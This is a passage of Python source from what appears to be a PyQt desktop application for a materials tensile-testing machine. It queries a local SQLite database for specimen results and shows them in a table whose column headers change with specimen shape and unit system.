(self.shape==\"Rectangle\"):            \n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.2f\\\", THICKNESS),printf(\\\"%.2f\\\", WIDTH),printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD) ,printf(\\\"%.2f\\\", PREC_E_AT_BREAK) ,printf(\\\"%.2f\\\", TENSILE_STRENGTH) ,printf(\\\"%.2f\\\", MODULUS_100) ,printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY)   FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.THICKNESS),printf(\\\"%.2f\\\", A.WIDTH),printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD) ,printf(\\\"%.2f\\\", PREC_E_AT_BREAK) ,printf(\\\"%.2f\\\", TENSILE_STRENGTH) ,printf(\\\"%.2f\\\", MODULUS_100) ,printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID,round(TENSILE_STRENGTH,2),round(MODULUS_100,2),round(MODULUS_200,2),round(MODULUS_300,2),round(MOD_AT_ANY,2) FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")       \n        elif (self.shape==\"Cylindrical\"):\n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.2f\\\", DIAMETER),printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", BREAK_LOAD),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.DIAMETER),printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", BREAK_LOAD),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")\n        elif (self.shape==\"Pipe\"):            \n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.2f\\\", INN_DIAMETER),printf(\\\"%.2f\\\", OUT_DIAMTER),printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")           \n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.INN_DIAMETER),printf(\\\"%.2f\\\", A.OUT_DIAMTER),printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")       \n        elif (self.shape==\"DirectValue\"): \n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")           \n        else:\n            print(\"NO Val\")\n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")           \n            \n        for row_number, row_data in enumerate(results):                        \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):\n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n                                        \n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)     \n        connection.close()    \n\n    def guage_select_all_rows(self):\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(8)\n        font = QtGui.QFont()\n        font.setPointSize(10)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        #self.tableWidget.horizontalHeader().setStyleSheet(\"::section {background-color : lightGray;font-size:10pt;}\")\n   \n        #self.tableWidget.setRowCount(1)\n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setColumnWidth(0, 150)\n        self.tableWidget.setColumnWidth(1, 150)\n        self.tableWidget.setColumnWidth(2, 150)\n        self.tableWidget.setColumnWidth(3, 150)\n        self.tableWidget.setColumnWidth(4, 150)\n        self.tableWidget.setColumnWidth(5, 150)\n        self.tableWidget.setColumnWidth(6, 150)    \n        self.tableWidget.setColumnWidth(7, 150)\n        \n     \n        \n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT STG_GRAPH_TYPE,STG_UNIT_TYPE FROM GLOBAL_REPORTS_PARAM\") \n        for x in results:           \n            self.unit_typex=x[1]\n        connection.close()\n        \n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n           \n        # SELECT SHAPE FROM SPECIMEN_MST WHERE SPECIMEN_NAME IN ( SELECT SPECIMEN_NAME FROM TEST_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR))\n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT SHAPE FROM SPECIMEN_MST WHERE SPECIMEN_NAME IN ( SELECT SPECIMEN_NAME FROM TEST_MST WHERE TEST_ID IN (SELECT NEW_REPORT_TEST_ID FROM GLOBAL_VAR))\") \n        for x in results:\n            self.shape=x[0]\n        connection.close()\n        #self.shape='Pipe'                                 \n        print (\"shape :\"+self.shape)        \n        if (self.shape==\"Rectangle\"):\n            if(self.unit_typex==\"Lb/Inch\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (Inch) ', ' Width \\n (Inch) ', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'% E@Break','Tensile Strength \\n (Lb/Inch2)','Yeild Strength \\n (Lb/Inch2)' ])        \n            elif(self.unit_typex == \"Newton/Mm\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (mm) ', ' Width \\n (mm) ', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'% E','Tensile Strength \\n (N/Mm2)','Yeild Strength \\n (N/Mm2)'])\n            elif(self.unit_typex == \"MPA\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (mm) ', ' Width \\n (mm) ', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'% E ','Tensile Strength \\n (MPA)','Yeild Strength \\n (MPA)'])\n            else:    \n                self.tableWidget.setHorizontalHeaderLabels(['Spe.No.', ' Thickness \\n (cm) ', ' Width \\n (cm) ', 'CS.Area \\n (cm2)','Force at Peak \\n (Kgf)' ,'% E','Tensile Strength \\n (Kgf/Cm2)','Yeild Strength \\n (Kgf/Cm2)'])        \n        \n        \n            \n        elif (self.shape==\"Cylindrical\"):     \n            self.tableWidget.setColumnCount(13)\n            self.lastIndex=12\n            if(self.unit_typex==\"Lb/Inch\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (Inch)', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (Inch)','% E@Break','Tensile Strength \\n (Lb/Inch2)','Yeild Strength \\n (Lb/Inch2)','Mod@100% \\n (Lb/Inch2)','Mod@200% \\n (Lb/Inch2)','Mod@300% \\n (Lb/Inch2)','Mod % (Lb/Inch2)'])\n            elif(self.unit_typex == \"Newton/Mm\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (N/Mm2)','Yeild Strength \\n (N/Mm2)','Mod@100% \\n (N/Mm2)','Mod@200% \\n (N/Mm2)','Mod@300% \\n (N/Mm2)','Mod %'])\n            elif(self.unit_typex == \"MPA\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (MPA)','Yeild Strength \\n (N/mm2)','Mod@100% \\n (MPA)','Mod@200% \\n (MPA)','Mod@300% \\n (MPA)','Mod %'])\n            else: \n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Diameter \\n (cm)', 'CS.Area \\n (cm2)','Force at Peak \\n (Kg)' ,'E@Peak \\n (cm)','% E@Peak','E@Break \\n (cm)','% E@Break','Tensile Strength \\n (Kg/Cm2)','Yeild Strength \\n (Kgf/Cm2)','Mod@100% \\n (Kg/Cm2)','Mod@200% \\n (Kg/Cm2)','Mod@300% \\n (Kg/Cm2)','Mod %'])\n        \n        elif (self.shape==\"Pipe\"):            \n            self.tableWidget.setColumnCount(14)\n            self.lastIndex=13\n            if(self.unit_typex==\"Lb/Inch\"):\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (Inch)', 'Out. Diameter \\n (Inch)', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (Inch)','% E@Break','Tensile Strength \\n (Lb/Inch2)','Yeild Strength \\n (Lb/Inch2)','Mod@100% \\n (Lb/Inch2)','Mod@200% \\n (Lb/Inch2)','Mod@300% \\n (Lb/Inch2)','Mod % (Lb/Inch2)'])\n            elif(self.unit_typex == \"Newton/Mm\"):\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (Inch)', 'Out. Diameter \\n (Inch)', 'CS.Area \\n (Inch2)','Force at Peak \\n (N)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (N/Mm2)','Yeild Strength \\n (N/Mm2)','Mod@100% \\n (N/Mm2)','Mod@200% \\n (N/Mm2)','Mod@300% \\n (N/Mm2)','Mod %']) \n            elif(self.unit_typex == \"MPA\"):\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (mm)', 'Out. Diameter \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (MPA)','Yeild Strength \\n (MPA)','Mod@100% \\n (MPA)','Mod@200% \\n (MPA)','Mod@300% \\n (MPA)','Mod %']) \n            else:\n               self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Inn.Diameter \\n (cm)', 'Out. Diameter \\n (cm)', 'CS.Area \\n (cm2)','Force at Peak \\n (Kgf)' ,'E@Peak \\n (cm)','% E@Peak','E@Break \\n (cm)','% E@Break','Tensile Strength \\n (Kgf/Cm2)','Yeild Strength \\n (Kg.Cm2)','Mod@100% \\n (Kgf/Cm2)','Mod@200% \\n (Kgf/Cm2)','Mod@300% \\n (Kgf/Cm2)','Mod %'])\n        elif (self.shape==\"DirectValue\"): \n            self.tableWidget.setColumnCount(12)\n            self.lastIndex=11\n            if(self.unit_typex==\"Lb/Inch\"):\n                #print(\"header\")\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (Inch2)','Force at Peak \\n (Lb)' ,'E@Peak \\n (Inch)','% E@Peak','E@Break \\n (Inch)','% E@Break','Tensile Strength \\n (Lb/Inch2)','Yeild Strength \\n (Lb/Inch2)','Mod@100% \\n (Lb/Inch2)','Mod@200% \\n (Lb/Inch2)','Mod@300% \\n (Lb/Inch2)','Mod %'])           \n            elif(self.unit_typex == \"Newton/Mm\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (N/Mm2)','Yeild Strength \\n (N/Mm2)','Mod@100% \\n (N/Mm2)','Mod@200% \\n (N/Mm2)','Mod@300% \\n (N/Mm2)','Mod %'])\n            elif(self.unit_typex == \"MPA\"):\n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (mm2)','Force at Peak \\n (N)' ,'E@Peak \\n (mm)','% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (MPA)','Yeild Strength \\n (MPA)','Mod@100% \\n (MPA)','Mod@200% \\n (MPA)','Mod@300% \\n (MPA)','Mod %'])\n            else:   \n                self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'CS.Area \\n (cm2)','Force at Peak \\n (Kg)' ,'E@Peak \\n (cm)','% E@Peak','E@Break \\n (cm)','% E@Break','Tensile Strength \\n (Kg/Cm2)','Yeild Strength \\n (Kg/Cm2)','Mod@100% \\n (Kg/Cm2)','Mod@200% \\n (Kg/Cm2)','Mod@300% \\n (Kg/Cm2)','Mod %'])           \n        else:\n           self.tableWidget.setHorizontalHeaderLabels(['Spe. No.', 'Thickness \\n (mm)', 'Width \\n (mm)', 'CS.Area \\n (mm2)','Force at Peak \\n (kg)' ,'% E@Peak','E@Break \\n (mm)','% E@Break','Tensile Strength \\n (Kg/Cm2)','Yeild Strength \\n (Kgf/Cm2)','Mod@100% \\n (Kg/Cm2)','Mod@200% \\n (Kg/Cm2)','Mod@300% \\n (Kg/Cm2)','Mod %'])\n        '''\n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT MOD_AT_ANY FROM REPORT_MST WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")                        \n        for rows in results:\n                print(\" self.lastIndex :\"+str(self.lastIndex))\n                item = self.tableWidget.horizontalHeaderItem(self.lastIndex)\n                if(self.unit_typex==\"Lb/Inch\"):\n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (Lb/Inch2)\")\n                elif(self.unit_typex == \"Newton/Mm\"):\n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (N/Mm2)\")                    \n                elif(self.unit_typex == \"MPA\"):\n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (MPA)\")    \n                else: \n                    item.setText(\"Mod@\"+str(rows[0])+\"% \\n (Kgf/Cm2)\")\n         '''           \n             \n        connection = sqlite3.connect(\"tyr.db\")\n        print(\"shape : \"+str(self.shape))\n        if (self.shape==\"Rectangle\"):            \n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.2f\\\", THICKNESS),printf(\\\"%.2f\\\", WIDTH),printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK) ,printf(\\\"%.2f\\\", TENSILE_STRENGTH) ,printf(\\\"%.2f\\\", def_yeild_strg)   FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.THICKNESS),printf(\\\"%.2f\\\", A.WIDTH),printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK) ,printf(\\\"%.2f\\\", TENSILE_STRENGTH) ,printf(\\\"%.2f\\\", def_yeild_strg)  FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID,round(TENSILE_STRENGTH,2),round(MODULUS_100,2),round(MODULUS_200,2),round(MODULUS_300,2),round(MOD_AT_ANY,2) FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")       \n        elif (self.shape==\"Cylindrical\"):\n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.2f\\\", DIAMETER),printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", BREAK_LOAD),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.DIAMETER),printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", BREAK_LOAD),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")\n        elif (self.shape==\"Pipe\"):            \n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.2f\\\", INN_DIAMETER),printf(\\\"%.2f\\\", OUT_DIAMTER),printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")           \n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.INN_DIAMETER),printf(\\\"%.2f\\\", A.OUT_DIAMTER),printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")       \n        elif (self.shape==\"DirectValue\"): \n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2 A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_PART_2 WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")           \n        else:\n            print(\"NO Val\")\n            results=connection.execute(\"SELECT TYPE_STR as specimen_no,printf(\\\"%.4f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_BREAK),printf(\\\"%.2f\\\", TENSILE_STRENGTH),printf(\\\"%.2f\\\", def_yeild_strg),printf(\\\"%.2f\\\", MODULUS_100),printf(\\\"%.2f\\\", MODULUS_200),printf(\\\"%.2f\\\", MODULUS_300),printf(\\\"%.2f\\\", MOD_AT_ANY) FROM REPORT_PART_2_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")\n            results1=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.4f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_PAEK_LOAD),printf(\\\"%.2f\\\", PREC_E_AT_PEAK),printf(\\\"%.2f\\\", 